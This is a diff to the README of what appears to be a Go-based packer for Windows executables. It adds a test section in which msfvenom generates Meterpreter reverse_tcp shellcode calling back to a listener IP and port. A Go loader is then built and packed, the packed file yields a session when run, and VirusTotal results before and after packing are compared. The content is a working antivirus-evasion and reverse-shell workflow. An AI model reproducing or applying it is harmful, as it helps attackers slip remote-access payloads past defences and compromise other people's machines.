@@ -41,7 +41,7 @@ go build -o packer.exe .\cmd\packer.go
 
 # Test
 
-## logic test
+## logic test-msf exe
 
 - use msfvenom create a test pe file
 
@@ -63,17 +63,56 @@ packer.exe win_normal.exe win_pack.exe
 
 - execute new file and msf get a session
 
-![session](./images/session.png)
+![session](./images/session-exe.png)
+
+
+
+## logic test-msf shellcode
+
+- use msfvenom create a test shellcode
+
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.65.128 lport=9999 -f golang -o golang_exp.txt
+```
+
+- msf create a listener
+
+  ![image-20230607182327184](./images/msf.png)
+
+- use golang shellcode loader create a exe file
+- use our project packshell create a new file
+
+```
+go build .\cmd\shell.go
+go build .\cmd\packer.go
+packer.exe win_sc_normal.exe win_sc_pack.exe
+```
+
+- execute new file and msf get a session
+
+![image-20230607182557515](.\images\session-sc.png)
 
 ## anti-virus test
 
+### msf exe
+
 - unpack file in virustotal
 
-![unpack](./images/unpack.png)
+![unpack](./images/unpack-exe.png)
 
 - packed file in virustotal
 
-![packed](./images/packed.png)
+![packed](./images/packed-exe.png)
+
+### msf shellcode
+
+- unpack file in virustotal
+
+![image-20230607182947156](.\images\unpack-sc.png)
+
+- packed file in virustotal
+
+![image-20230607183021362](.\images\packed-sc.png)
 
 # TODO
 
